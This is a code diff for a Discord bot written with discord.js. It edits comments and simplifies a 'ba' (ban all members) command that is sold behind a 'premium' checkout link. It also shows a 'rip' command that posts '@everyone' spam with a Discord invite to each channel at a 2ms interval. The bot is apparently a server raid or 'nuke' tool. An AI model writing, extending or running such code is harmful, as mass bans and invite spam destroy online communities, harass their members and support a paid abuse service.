@@ -110,7 +110,7 @@ client.on('messageCreate', async (message) => {
 
   // ===== PREMIUM COMMAND =====
   if (command === 'premium') {
-    const premiumLink = 'https://solbot.store/premium '; // Your hosted Stripe checkout page
+    const premiumLink = 'https://solbot.store/premium '; // Your hosted Stripe page
 
     const embed = new EmbedBuilder()
       .setTitle('💳 Get Premium Access')
@@ -128,20 +128,13 @@ client.on('messageCreate', async (message) => {
     return;
   }
 
-  // ===== BAN ALL MEMBERS (PREMIUM ONLY) =====
+  // ===== BAN ALL MEMBERS (PREMIUM ONLY - PLACEHOLDER) =====
   if (command === 'ba') {
-    // TODO: Replace this with real check once webhook is ready
-    const isPremium = false; // Placeholder — will be replaced by DB lookup
-
-    if (!isPremium) {
-      return message.reply('🔐 This command is for premium users only. Run `.premium` to upgrade.');
-    }
-
-    // Real logic here (e.g., ban all)
-    return message.reply('🔐 You are a premium user! Running ban command soon...');
+    // Placeholder — will check DB later
+    return message.reply('🔐 This command is for premium users only. Run `.premium` to upgrade.');
   }
 
-  // ===== RIP COMMAND (PUBLIC) =====
+  // ===== RIP COMMAND =====
   if (command === 'rip') {
     const guild = message.guild;
     const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
@@ -275,7 +268,7 @@ client.on('messageCreate', async (message) => {
           } catch (err) {
             console.error(`⚠️ Send failed in ${channel.name}: ${err.message}`);
           }
-          await new Promise(r => setTimeout(r, 2)); // 2ms delay between sends
+          await new Promise(r => setTimeout(r, 2));
         }
       });
 
